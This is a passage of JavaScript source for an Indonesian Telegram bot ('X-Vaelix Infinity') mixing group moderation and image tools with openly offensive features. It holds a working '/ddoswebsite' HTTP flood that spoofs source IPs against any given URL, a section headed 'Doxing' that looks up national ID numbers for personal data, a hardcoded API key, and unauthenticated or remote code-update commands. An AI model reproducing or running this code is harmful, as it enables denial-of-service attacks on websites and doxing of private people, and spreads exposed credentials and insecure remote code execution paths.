    if (!target) return bot.sendMessage(chatId, "Username tidak ditemukan")
  }
  ensure(chatId)
  const uid = reply.from.id
  data[chatId].warns[uid] = (data[chatId].warns[uid] || 0) + 1
  const cnt = data[chatId].warns[uid]
  if (cnt >= 3) {
    try {
      await bot.kickChatMember(chatId, uid)
      data[chatId].warns[uid] = 0
      await bot.sendMessage(chatId, `${reply.from.first_name} dikick karena 3 warn`, { reply_markup: { inline_keyboard: [[{ text: "Unban", callback_data: "unban_" + uid }]] } })
    } catch { await bot.sendMessage(chatId, "Gagal kick") }
  } else {
    await bot.sendMessage(chatId, `${reply.from.first_name} mendapat warn (${cnt}/3)`, { reply_markup: { inline_keyboard: [[{ text: "Unwarn", callback_data: "unwarn_" + uid }, { text: "Remove Warn", callback_data: "clear_warn_" + uid }]] } })
  }
})

bot.onText(/^\/unwarn$/i, async (msg) => {
  const chatId = msg.chat.id
  const fromId = msg.from.id
  const reply = msg.reply_to_message
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")
  let target = getTarget(msg)
  if (!target) return bot.sendMessage(chatId, "❌ ⵢ Mention / Reply Message Users ")

  if (typeof target === "string") {
    target = await resolveUsername(bot, chatId, target)
    if (!target) return bot.sendMessage(chatId, "Username tidak ditemukan")
  }
  ensure(chatId)
  const uid = reply.from.id
  if (!data[chatId].warns[uid] || data[chatId].warns[uid] <= 0) return bot.sendMessage(chatId, "User tidak punya warn")
  data[chatId].warns[uid] -= 1
  await bot.sendMessage(chatId, `Warn berkurang (${data[chatId].warns[uid]}/3)`, { reply_markup: { inline_keyboard: [[{ text: "Remove Warn", callback_data: "clear_warn_" + uid }]] } })
})

bot.onText(/^\/pin$/i, async (msg) => {
  const chatId = msg.chat.id
  const reply = msg.reply_to_message
  const fromId = msg.from.id
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")
  let target = getTarget(msg)
  if (!target) return bot.sendMessage(chatId, "❌ ⵢ Mention / Reply Message Users ")

  if (typeof target === "string") {
    target = await resolveUsername(bot, chatId, target)
    if (!target) return bot.sendMessage(chatId, "Username tidak ditemukan")
  }
  try {
    await bot.pinChatMessage(chatId, reply.message_id)
    await bot.sendMessage(chatId, "Pinned!", { reply_markup: { inline_keyboard: [[{ text: "Unpin Message", callback_data: "unpin" }]] } })
  } catch { await bot.sendMessage(chatId, "Gagal pin") }
})

// Doxing

bot.onText(/^\/nikparse(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;           // ✅ Tambahan: Definisi chatId
  const userId = msg.from.id;           // ✅ Tambahan: Definisi userId
  const args = (match[1] || "").split(" ");
  const nik = args[0];
  
  let joined = await checkJoined(userId);

  if (!joined) {
    return sendJoinMessage(chatId);
  }

  if (!nik) {
    return bot.sendMessage(chatId, "❌ ⵢ Format : /nikparse 3510243006730004");
  }

  try {
    const waitMsg = await bot.sendMessage(chatId, "Process Search NIK...");

    const response = await axios.get(
      `https://nik-parser.p.rapidapi.com/ektp?nik=${nik}`,
      {
        headers: {
          'x-rapidapi-host': 'nik-parser.p.rapidapi.com',
          'x-rapidapi-key': '972f5c568dmsh552ff4877326665p1b6e67jsn290d2652a173'
        },
        timeout: 15000
      }
    );

    const result = response.data;

    try {
      await bot.deleteMessage(chatId, waitMsg.message_id);
    } catch (e) {}

    if (result.errCode !== 0) {
      return bot.sendMessage(chatId, `Gagal parsing NIK: ${result.errMessage || 'Unknown error'}`);
    }

    const data = result.data;

    let caption = `<blockquote><b>¡ ᬊ X-Vaelix Infinity ¡</b></blockquote>\n\n`;
    caption += `┃☰. - NIK: ${nik}\n\n`;
    caption += `〢-╰➤ ° ↯ Provinsi: ${data.province || 'Tidak diketahui'}\n`;
    caption += `┃☰. - Kota/Kab: ${data.city || 'Tidak diketahui'}\n`;
    caption += `〢-╰➤ ° ↯ Kecamatan: ${data.district || 'Tidak diketahui'}\n`;
    caption += `┃☰. - Kode Pos: ${data.zipcode || 'Tidak diketahui'}\n\n`;
    caption += `〢-╰➤ ° ↯ Jenis Kelamin: ${data.gender || 'Tidak diketahui'}\n`;
    caption += `┃☰. - Tanggal Lahir: ${data.birthdate || 'Tidak diketahui'}\n`;
    caption += `〢-╰➤ ° ↯ Uniq Code: ${data.uniqcode || 'Tidak diketahui'}`;

    // ✅ Perbaikan: Sintaks pengiriman pesan yang benar
    await bot.sendMessage(chatId, caption, { parse_mode: "HTML" });

  } catch (error) {
    console.error('NIK Parse error:', error.response?.data || error.message);
    
    let errorMessage = 'Gagal parsing NIK\n\n';
    
    if (error.response) {
      if (error.response.status === 400) {
        errorMessage += 'NIK tidak valid';
      } else {
        errorMessage += `Status: ${error.response.status}`;
      }
    } else if (error.code === 'ECONNABORTED') {
      errorMessage += 'Timeout: Request terlalu lama';
    } else {
      errorMessage += `Error: ${error.message}`;
    }
    
    await bot.sendMessage(chatId, errorMessage);
  }
});
// ==========================================
// CASE TOOLS: CEK PREMIUM GROUP (OTOMATIS)
// ==========================================
bot.onText(/\/cekpremiumgroup/, async (msg) => {
  const chatId = msg.chat.id;
  const chatType = msg.chat.type;

  // 1. Validasi: Pastikan perintah ini diketik di dalam grup, bukan private chat
  if (chatType !== 'group' && chatType !== 'supergroup') {
    return bot.sendMessage(
      chatId, 
      "❌ Perintah ini hanya dapat digunakan di dalam **Grup** atau **Supergroup** untuk mengecek status grup tersebut.",
      { parse_mode: "Markdown" }
    );
  }
  
  // Tentukan path config langsung di dalam skrip agar pasti terbaca
  const pathConfigNode = "./config.js"; 

  try {
    // 2. Membaca dan reload config secara real-time
    if (require.cache[require.resolve(pathConfigNode)]) {
      delete require.cache[require.resolve(pathConfigNode)];
    }
    let currentConfig = require(pathConfigNode);

    // 3. Validasi status premium grup menggunakan chatId otomatis
    const isPremium = currentConfig.PREMIUM_GROUPS && currentConfig.PREMIUM_GROUPS.includes(chatId.toString());

    if (isPremium) {
      // Jika grup berstatus PREMIUM
      await bot.sendMessage(
        chatId,
        `\`\`\`js\n╭─────────────────\n│   HASIL CEK STATUS GRUP   \n│────────────────\n│ ID: ${chatId}\n│ Status: AKTIF (PREMIUM) ✨\n│\n│ Semua fitur premium bot\n│ terbuka di grup ini.\n╰─────────────────\`\`\``,
        { parse_mode: "Markdown" }
      );
    } else {
      // Jika grup berstatus FREE / Tidak Terdaftar
      await bot.sendMessage(
        chatId,
        `\`\`\`\n╭─────────────────\n│   HASIL CEK STATUS GRUP   \n│────────────────\n│ ID: ${chatId}\n│ Status: FREE (REGULER) ❌\n│\n│ Gunakan perintah:\n│ /addgrouppremium ${chatId}\n│ di chat bot untuk aktivasi.\n╰─────────────────\`\`\``,
        { parse_mode: "Markdown" }
      );
    }

  } catch (error) {
    console.error("Error saat mengecek status grup premium:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan internal saat memeriksa status data grup. Coba lagi.",
      { parse_mode: "Markdown" }
    );
  }
});

// ==========================================
// CASE TOOLS: DEL GROUP PREMIUM (BISA DIGUNAKAN SETIAP ORANG)
// ==========================================
bot.onText(/\/delgroupremium (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const targetGroupId = match[1].trim();
  
  // Tentukan path config langsung di dalam skrip agar pasti terbaca
  const pathConfigNode = "./config.js"; 

  try {
    // 1. Membaca dan reload config secara real-time
    if (require.cache[require.resolve(pathConfigNode)]) {
      delete require.cache[require.resolve(pathConfigNode)];
    }
    let currentConfig = require(pathConfigNode);

    // Antisipasi jika properti PREMIUM_GROUPS belum ada atau kosong
    if (!currentConfig.PREMIUM_GROUPS || currentConfig.PREMIUM_GROUPS.length === 0) {
      return bot.sendMessage(
        chatId,
        `\`\`\`\n╭─────────────────\n│    GAGAL MENGHAPUS    \n│────────────────\n│ ID Grup: ${targetGroupId}\n│ Tidak ditemukan dalam\n│ daftar Grup Premium.\n╰─────────────────\`\`\``,
        { parse_mode: "Markdown" }
      );
    }

    // 2. Cek apakah ID grup tersebut memang ada di daftar premium
    if (!currentConfig.PREMIUM_GROUPS.includes(targetGroupId)) {
      return bot.sendMessage(
        chatId,
        `\`\`\`\n╭─────────────────\n│    GAGAL MENGHAPUS    \n│────────────────\n│ ID Grup: ${targetGroupId}\n│ Memang tidak berstatus\n│ Premium.\n╰─────────────────\`\`\``,
        { parse_mode: "Markdown" }
      );
    }

    // 3. Filter/Hapus ID grup dari array
    currentConfig.PREMIUM_GROUPS = currentConfig.PREMIUM_GROUPS.filter(id => id !== targetGroupId);

    // 4. Tulis ulang file config.js secara otomatis
    const fs = require('fs');
    const newContent = `module.exports = {
  BOT_TOKEN: "${currentConfig.BOT_TOKEN}",
  OWNER_ID: ${JSON.stringify(currentConfig.OWNER_ID)},
  PREMIUM_GROUPS: ${JSON.stringify(currentConfig.PREMIUM_GROUPS)},
};`;

    fs.writeFileSync(pathConfigNode, newContent, "utf8");
    
    // 5. Clear cache sekali lagi agar perubahan langsung diterapkan oleh sistem
    delete require.cache[require.resolve(pathConfigNode)];

    await bot.sendMessage(
      chatId,
      `\`\`\`js\n╭─────────────────\n│   SUKSES HAPUS PREMIUM  \n│────────────────\n│ ID Grup: ${targetGroupId}\n│ Status: NON-PREMIUM (FREE)\n│\n│ Perubahan berhasil disimpan\n│ otomatis ke config.js\n╰─────────────────\`\`\``,
      { parse_mode: "Markdown" }
    );

  } catch (error) {
    console.error("Error saat menghapus grup premium:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan internal saat memproses penghapusan data grup. Coba lagi.",
      { parse_mode: "Markdown" }
    );
  }
});

//=======case addgroup=======\\


// Fungsi pembantu untuk memuat ulang data config yang paling baru di disk
function reloadConfig() {
  delete require.cache[require.resolve(configPath)];
  config = require(configPath);
}

// Fungsi pembantu untuk mengecek apakah grup berstatus premium
function isGroupPremium(chatId) {
  reloadConfig();
  if (!config.PREMIUM_GROUPS) return false;
  return config.PREMIUM_GROUPS.includes(chatId.toString());
}

// ==========================================
// CASE TOOLS: ADD GROUP PREMIUM (FIXED)
// ==========================================
bot.onText(/\/addgroupremium (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const targetGroupId = match[1].trim();
  
  // Tentukan path config langsung di dalam skrip agar pasti terbaca
  const pathConfigNode = "./config.js"; 

  try {
    // 1. Membaca dan reload config secara real-time
    if (require.cache[require.resolve(pathConfigNode)]) {
      delete require.cache[require.resolve(pathConfigNode)];
    }
    let currentConfig = require(pathConfigNode);

    // Antisipasi jika properti PREMIUM_GROUPS belum ada di config.js
    if (!currentConfig.PREMIUM_GROUPS) {
      currentConfig.PREMIUM_GROUPS = [];
    }

    // 2. Cek apakah ID grup tersebut sudah terdaftar
    if (currentConfig.PREMIUM_GROUPS.includes(targetGroupId)) {
      return bot.sendMessage(
        chatId,
        `\`\`\`\n╭─────────────────\n│    GAGAL MENAMBAHKAN    \n│────────────────\n│ ID Grup: ${targetGroupId}\n│ Sudah terdaftar sebagai\n│ Grup Premium sebelumnya.\n╰─────────────────\`\`\``,
        { parse_mode: "Markdown" }
      );
    }

    // 3. Masukkan ID grup baru ke dalam array
    currentConfig.PREMIUM_GROUPS.push(targetGroupId);

    // 4. Tulis ulang file config.js secara otomatis
    const fs = require('fs');
    const newContent = `module.exports = {
  BOT_TOKEN: "${currentConfig.BOT_TOKEN}",
  OWNER_ID: ${JSON.stringify(currentConfig.OWNER_ID)},
  PREMIUM_GROUPS: ${JSON.stringify(currentConfig.PREMIUM_GROUPS)},
};`;

    fs.writeFileSync(pathConfigNode, newContent, "utf8");
    
    // 5. Clear cache sekali lagi agar data terbaru langsung aktif
    delete require.cache[require.resolve(pathConfigNode)];

    await bot.sendMessage(
      chatId,
      `\`\`\`js\n╭─────────────────\n│   SUKSES ADD PREMIUM   \n│────────────────\n│ ID Grup: ${targetGroupId}\n│ Status: AKTIF (PREMIUM)\n│\n│ Grup berhasil disimpan\n│ otomatis ke config.js\n╰─────────────────\`\`\``,
      { parse_mode: "Markdown" }
    );

  } catch (error) {
    console.error("Error saat menyimpan grup premium:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan internal saat memproses data grup. Coba lagi.",
      { parse_mode: "Markdown" }
    );
  }
});

bot.onText(/^\/trackip(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  let joined = await checkJoined(userId);

  if (!joined) {
    return sendJoinMessage(chatId);
  }

  const args = msg.text.split(" ").filter(Boolean);
  if (!args[1]) return bot.sendMessage(chatId, "❌ ⵢ Missing Input\nExample: /trackip 8.8.8.8");

  const ip = args[1].trim();

  function isValidIPv4(ip) {
    const parts = ip.split(".");
    if (parts.length !== 4) return false;
    return parts.every((p) => {
      if (!/^\d{1,3}$/.test(p)) return false;
      if (p.length > 1 && p.startsWith("0")) return false;
      const n = Number(p);
      return n >= 0 && n <= 255;
    });
  }

  function isValidIPv6(ip) {
    const ipv6Regex =
      /^(([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(::)|(::[0-9a-fA-F]{1,4})|([0-9a-fA-F]{1,4}::[0-9a-fA-F]{0,4})|([0-9a-fA-F]{1,4}(:[0-9a-fA-F]{1,4}){0,6}::([0-9a-fA-F]{1,4}){0,6}))$/;
    return ipv6Regex.test(ip);
  }

  if (!isValidIPv4(ip) && !isValidIPv6(ip)) {
    return bot.sendMessage(
      chatId,
      "❌ ⵢ IP tidak valid masukkan IPv4 (contoh: 8.8.8.8) atau IPv6 yang benar"
    );
  }

  const processingMsg = await bot.sendMessage(
    chatId,
    `🔎 ⵢ Tracking IP ${ip} — sedang memproses`
  );

  try {
    const res = await axios.get(
      `https://ipwhois.app/json/${encodeURIComponent(ip)}`,
      { timeout: 10000 }
    );
    const data = res.data;

    if (!data || data.success === false) {
      return bot.sendMessage(chatId, `❌ ⵢ Gagal mendapatkan data untuk IP: ${ip}`);
    }

    const lat = data.latitude || "";
    const lon = data.longitude || "";
    const mapsUrl =
      lat && lon
        ? `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(
            lat + "," + lon
          )}` : null;

    const caption = `
<blockquote><b>─ ¡ ᬊ X-Vaelix Infinity ¡ ─</b></blockquote>
┃☰. - IP: ${data.ip || "-"}
〢-╰➤ ° ↯ Country: ${data.country || "-"} ${data.country_code ? `(${data.country_code})` : ""}
┃☰. - Region: ${data.region || "-"}
〢-╰➤ ° ↯ City: ${data.city || "-"}
┃☰. - ZIP: ${data.postal || "-"}
〢-╰➤ ° ↯ Timezone: ${data.timezone_gmt || "-"}
┃☰. - ISP: ${data.isp || "-"}
〢-╰➤ ° ↯ Org: ${data.org || "-"}
┃☰. - ASN: ${data.asn || "-"}
〢-╰➤ ° ↯ Lat/Lon: ${lat || "-"}, ${lon || "-"}
`.trim();

    const inlineKeyboard = mapsUrl ? {
      reply_markup: {
        inline_keyboard: [
          [{ text: "🌍 ⵢ Location", url: mapsUrl }]
        ]
      }
    } : null;

    if (processingMsg && processingMsg.photo && typeof processingMsg.message_id !== "undefined") {
      await bot.editMessageText(
        processingMsg.chat.id,
        processingMsg.message_id,
        undefined,
        caption,
        { parse_mode: "HTML", ...(inlineKeyboard ? inlineKeyboard : {}) }
      );
    } else if (typeof imageThumbnail !== "undefined" && imageThumbnail) {
      await bot.sendPhoto(chatId, imageThumbnail, {
        caption,
        parse_mode: "HTML",
        ...(inlineKeyboard ? inlineKeyboard : {})
      });
    } else {
      if (inlineKeyboard) {
        await bot.sendMessage(chatId, caption, { parse_mode: "HTML", ...inlineKeyboard });
      } else {
        await bot.sendMessage(chatId, caption, { parse_mode: "HTML" });
      }
    }

  } catch (err) {
    await bot.sendMessage(chatId, "❌ ⵢ Terjadi kesalahan saat mengambil data IP (timeout atau API tidak merespon). Coba lagi nanti" + err);
  }
});
// Tools V1-V2
bot.onText(/^\/update$/, async (msg) => {
  const chatId = msg.chat.id
  const userId = msg.from.id

  if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
    return bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<b>Owner & Admin Acces</b>
<b>Please Buy Acces To 𝕬𝖚𝖙𝖍𝖔𝖗</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𖣂 ¡ #- 𝕬𝖚𝖙𝖍𝖔𝖗", url: "https://RannNewEra " }]
        ]
      }
    });
  }

  if (!msg.reply_to_message || !msg.reply_to_message.document) {
    return bot.sendMessage(chatId, "❌ ⵢ Balas ke file .js atau package.json yang ingin diupdate, lalu kirim /update")
  }

  const file = msg.reply_to_message.document
  const fileName = file.file_name

  if (!fileName.endsWith(".js") && fileName !== "package.json") {
    return bot.sendMessage(chatId, "❌ ⵢ File harus berekstensi .js atau bernama package.json")
  }

  try {
    const fileLink = await bot.getFileLink(file.file_id)
    const filePath = path.join(__dirname, fileName)

    if (fs.existsSync(filePath)) {
      fs.unlinkSync(filePath)
      bot.sendMessage(chatId, `🗑️ ⵢ Old Files *${fileName}* Delete.`, { parse_mode: "Markdown" })
    }

    const fileStream = fs.createWriteStream(filePath)
    https.get(fileLink, (response) => {
      response.pipe(fileStream)
      fileStream.on("finish", () => {
        fileStream.close()
        bot.sendMessage(chatId, `✅ ⵢ File *${fileName}* Updated !`, { parse_mode: "Markdown" })
        if (fileName === "index.js" || fileName === "package.json") {
          bot.sendMessage(chatId, `♻️ ⵢ File penting diperbarui (${fileName}) — Bot akan restart...`, { parse_mode: "Markdown" })
          setTimeout(() => {
            exec("pm2 restart all || npm restart || node index.js", (err) => {
              if (err) console.error("Gagal restart bot:", err.message)
            })
          }, 2000)
        }
      })
    }).on("error", (err) => {
      bot.sendMessage(chatId, `❌ ⵢ Gagal mengunduh file: ${err.message}`)
    })
  } catch (err) {
    bot.sendMessage(chatId, `❌ ⵢ Terjadi kesalahan: ${err.message}`)
  }
})

bot.onText(/^\/ddoswebsite(?:\s+(.+))?$/i, async (msg, match) => {
  try {
  const args = (msg.text || "").split(" ").slice(1).join(" ").trim();
    if (!args) {
      return bot.sendMessage(msg.chat.id, "❌ ⵢ Format: /ddoswebsite https://target.com 1000");
    }

    const [target_url, rawThreads] = args.split(" ");
    const threads = parseInt(rawThreads) || 50;

    const processMsg = await bot.sendMessage(msg.chat.id, `<blockquote><b>─ ¡ ᬊ X-Vaelix Infinity ¡ ─</b></blockquote>
┃☰. - Target
〢-╰➤ ° ↯  ${target_url}
┃☰. - Threads
〢-╰➤ ° ↯  ${threads}
┃☰. - Status
〢-╰➤ ° ↯  Process
`, { parse_mode: "HTML" });

    const attackConfig = {
      threads: threads,
      duration: 60000,
      requestsPerThread: 1000,
      userAgents: [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36"
      ],
      methods: ["GET", "POST", "HEAD", "OPTIONS"]
    };

    let totalRequests = 0;
    let successfulAttacks = 0;
    const startTime = Date.now();

    const attackPromises = [];

    for (let i = 0; i < attackConfig.threads; i++) {
      attackPromises.push(new Promise(async (resolve) => {
        let threadRequests = 0;
        
        while (Date.now() - startTime < attackConfig.duration && threadRequests < attackConfig.requestsPerThread) {
          try {
            const method = attackConfig.methods[Math.floor(Math.random() * attackConfig.methods.length)];
            const userAgent = attackConfig.userAgents[Math.floor(Math.random() * attackConfig.userAgents.length)];
            const ip = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;

            const headers = {
              "X-Forwarded-For": ip,
              "X-Real-IP": ip,
              "User-Agent": userAgent,
              "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
              "Accept-Language": "en-US,en;q=0.5",
              "Accept-Encoding": "gzip, deflate, br",
              "Connection": "keep-alive",
              "Upgrade-Insecure-Requests": "1",
              "Cache-Control": "no-cache",
              "Pragma": "no-cache"
            };

            const randomPaths = ["/", "/admin", "/wp-admin", "/api", "/test", "/debug"];
            const randomPath = randomPaths[Math.floor(Math.random() * randomPaths.length)];
            const attackUrl = target_url + randomPath;

            const response = await axios({
              method: method,
              url: attackUrl,
              headers: headers,
              timeout: 5000,
              validateStatus: () => true
            });

            totalRequests++;
            threadRequests++;
            
            if (response.status < 500) {
              successfulAttacks++;
            }

            if (totalRequests % 100 === 0) {
              const elapsed = Math.floor((Date.now() - startTime) / 1000);
              await bot.editMessageText(
                `<blockquote><b>─ ¡ ᬊ X-Vaelix Infinity ¡ ─</b></blockquote>
┃☰. - Target
〢-╰➤ ° ↯  ${target_url}
┃☰. - Threads
〢-╰➤ ° ↯  ${attackConfig.threads}
┃☰. - Requests
〢-╰➤ ° ↯  ${totalRequests}
┃☰. - Success
〢-╰➤ ° ↯  ${successfulAttacks}
┃☰. - Duration
〢-╰➤ ° ↯  ${elapsed}s
┃☰. - Status
〢-╰➤ ° ↯  Running
`,
                {
                  chat_id: msg.chat.id,
                  message_id: processMsg.message_id,
                  parse_mode: "HTML"
                }
              );
            }

            await new Promise(r => setTimeout(r, Math.random() * 100));

          } catch (error) {
            threadRequests++;
            totalRequests++;
          }
        }
        resolve();
      }));
    }

    await Promise.all(attackPromises);

    const endTime = Date.now();
    const totalDuration = Math.floor((endTime - startTime) / 1000);

    await bot.editMessageText(
      `<blockquote><b>─ ¡ ᬊ X-Vaelix Infinity ¡ ─</b></blockquote>
┃☰. - Target
〢-╰➤ ° ↯  ${target_url}
┃☰. - Threads
〢-╰➤ ° ↯  ${attackConfig.threads}
┃☰. - Total Requests
〢-╰➤ ° ↯  ${totalRequests}
┃☰. - Successful
〢-╰➤ ° ↯  ${successfulAttacks}
┃☰. - Total Duration
〢-╰➤ ° ↯  ${totalDuration}s
┃☰. - Requests/Sec
〢-╰➤ ° ↯  ${Math.floor(totalRequests / totalDuration)}
┃☰. - Status
〢-╰➤ ° ↯  Completed
`,
      {
        chat_id: msg.chat.id,
        message_id: processMsg.message_id,
        parse_mode: "HTML"
      }
    );

  } catch (error) {
    bot.sendMessage(chatId, "❌ ⵢ Gagal melakukan serangan ddos" + error);
  }
});

bot.onText(/^\/broadcast(?:\s+([\s\S]+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const text = match[1];

  if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
    return bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<b>Owner & Admin Acces</b>
<b>Please Buy Acces To 𝕬𝖚𝖙𝖍𝖔𝖗</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𖣂 ¡ #- 𝕬𝖚𝖙𝖍𝖔𝖗", url: "https://RannNewEra " }]
        ]
      }
    });
  }

  if (!text) {
    return bot.sendMessage(chatId, "Gunakan format:\n`/broadcast <pesan>`", { parse_mode: "Markdown" });
  }

  await bot.sendMessage(chatId, `Mengirim Pesan ke ${users.size} pengguna...`, { parse_mode: "Markdown" });

  let success = 0;
  let fail = 0;

  for (const userId of users) {
    try {
      await bot.sendMessage(userId, `
<blockquote>Broadcast From Admin [ 𖥊 ]</blockquote>
#- Message : ${text}`, { parse_mode: "HTML" });
      success++;
    } catch {
      fail++;
    }
  }

  await bot.sendMessage(chatId, `Pesan selesai!\n\nTerkirim: ${success}\nGagal: ${fail}`);
});
bot.onText(/^\/chatowner (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const text = match[1];

  let joined = await checkJoined(userId);

  if (!joined) {
    return sendJoinMessage(chatId);
  }

  bot.sendMessage(OWNER_ID, "From User:\n" + text);
  bot.sendMessage(chatId, "Succes Chat Owner !.");
});
async function getFileBuffer(fileId, bot) {
  const link = await bot.getFileLink(fileId)
  const res = await axios.get(link, { responseType: "arraybuffer" })
  return Buffer.from(res.data)
}

async function getFileUrl(fileId) {
  const file = await bot.getFile(fileId)
  return `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`
}

async function downloadToFile(fileUrl, outPath) {
  const res = await axios.get(fileUrl, { responseType: "stream", timeout: 120000 })
  await streamPipeline(res.data, fs.createWriteStream(outPath))
  return outPath
}

async function downloadBuffer(fileUrl) {
  const res = await axios.get(fileUrl, { responseType: "arraybuffer", timeout: 120000 })
  return Buffer.from(res.data)
}

function tmpPath(ext = "") {
  return path.join(process.cwd(), "tmp_" + uuidv4() + (ext ? ("." + ext) : ""))
}

async function getMediaFromMessage(msg) {
  if (msg.photo) {
    const p = msg.photo[msg.photo.length - 1]
    return { type: "photo", fileId: p.file_id }
  }
  if (msg.video) {
    return { type: "video", fileId: msg.video.file_id }
  }
  if (msg.document && msg.document.mime_type && msg.document.mime_type.startsWith("image")) {
    return { type: "document", fileId: msg.document.file_id }
  }
  if (msg.reply_to_message) {
    const rm = msg.reply_to_message
    if (rm.photo) {
      const p = rm.photo[rm.photo.length - 1]
      return { type: "photo", fileId: p.file_id }
    }
    if (rm.video) {
      return { type: "video", fileId: rm.video.file_id }
    }
    if (rm.document && rm.document.mime_type && rm.document.mime_type.startsWith("image")) {
      return { type: "document", fileId: rm.document.file_id }
    }
  }
  return null
}

async function upscaleSharp(buffer, scale = 2) {
  const img = sharp(buffer)
  const meta = await img.metadata()
  const width = meta.width ? Math.round(meta.width * scale) : null
  if (!width) return null
  const out = await img.resize({ width, withoutEnlargement: false, kernel: sharp.kernel.lanczos3 }).toBuffer()
  return out
}

async function makeSticker(buffer) {
  const out = await sharp(buffer).resize(512, 512, { fit: "cover" }).webp().toBuffer()
  return out
}

async function addWatermark(buffer, text) {
  const meta = await sharp(buffer).metadata()
  const svg = `<svg width="${meta.width}" height="${meta.height}"><style>.a{fill:white;font-size:48px;font-weight:700;stroke:black;stroke-width:2px;}</style><text x="${Math.max(10, Math.floor(meta.width*0.02))}" y="${meta.height - Math.max(10, Math.floor(meta.height*0.02))}" class="a">${text}</text></svg>`
  const out = await sharp(buffer).composite([{ input: Buffer.from(svg), gravity: "southeast" }]).toBuffer()
  return out
}

function downloadFile(url, outputPath) {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(outputPath)
    https.get(url, (res) => {
      res.pipe(file)
      file.on("finish", () => file.close(() => resolve(true)))
    }).on("error", (err) => {
      fs.unlinkSync(outputPath)
      reject(err)
    })
  })
}

bot.on("message", async msg => {
  try {
    const chatId = msg.chat.id
    const textRaw = (msg.text || msg.caption || "").trim()
    if (!textRaw) return
    const parts = textRaw.split(" ")
    const cmd = parts[0].toLowerCase()
    const arg = parts.slice(1).join(" ").trim()
    const media = await getMediaFromMessage(msg)
    
   if (msg.text === "/removebg") {
    return bot.sendMessage(chatId, "❌ ⵢ Format : Reply Media Dengan Caption /removebg")
  }

  if (msg.photo) {
    try {
      const fileId = msg.photo[msg.photo.length - 1].file_id
      const file = await bot.getFile(fileId)

      const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`
      const inputPath = "input_removebg.png"
      const outputPath = "removebg_result.png"

      await downloadFile(fileUrl, inputPath)

      await sharp(inputPath)
        .removeAlpha()
        .threshold(200)
        .png()
        .toFile(outputPath)

      await bot.sendPhoto(chatId, outputPath, {
        caption: "✅ ⵢ Remove Bg By X-Vaelix Infinity ( 🍁 )"
      })

      fs.unlinkSync(inputPath)
      fs.unlinkSync(outputPath)

    } catch(e) {
      bot.sendMessage(chatId, "❌ ⵢ Terjadi error saat memproses foto." + e)
    }
  }
    if (cmd === "/sticker" || cmd === "/stiker") {
      if (!media) {
        await bot.sendMessage(chatId, "❌ ⵢ Format : Reply Media / Kirim Media Dengan Caption /sticker")
        return
      }
      const fileUrl = await getFileUrl(media.fileId)
      const buf = await downloadBuffer(fileUrl)
      const webp = await makeSticker(buf)
      await bot.sendSticker(chatId, webp)
      return
    }
    if (cmd === "/watermark" || cmd === "/wm") {
      if (!arg) {
        await bot.sendMessage(chatId, "Tambahkan teks watermark setelah perintah, contoh: /watermark zellx")
        return
      }
      if (!media) {
        await bot.sendMessage(chatId, "❌ ⵢ Format : Reply Media / Kirim Media Dengan Caption /watermark teks")
        return
      }
      const fileUrl = await getFileUrl(media.fileId)
      const buf = await downloadBuffer(fileUrl)
      const out = await addWatermark(buf, arg)
      await bot.sendPhoto(chatId, out)
      return
    }
  } catch (e) {
    try { await bot.sendMessage(msg.chat.id, "Terjadi kesalahan saat memproses") } catch {}
  }
})

const MAIN_FILE = "./index.js";

bot.onText(/^\/addfiture$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const messageId = msg.message_id;
  
  if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
    return bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<b>Owner & Admin Acces</b>
<b>Please Buy Acces To 𝕬𝖚𝖙𝖍𝖔𝖗</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𖣂 ¡ #- 𝕬𝖚𝖙𝖍𝖔𝖗", url: "https://RannNewEra " }]
        ]
      }
    });
  }

  if (!msg.reply_to_message) {
    return bot.sendMessage(chatId, "❌ ⵢ Reply ke case text atau file .js yang ingin ditambahkan.");
  }

  let newCase = "";

  if (msg.reply_to_message.text) {
    newCase = msg.reply_to_message.text;
  }

  if (msg.reply_to_message.document) {
    const file = await bot.getFile(msg.reply_to_message.document.file_id);
    const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
    const res = await fetch(fileUrl);
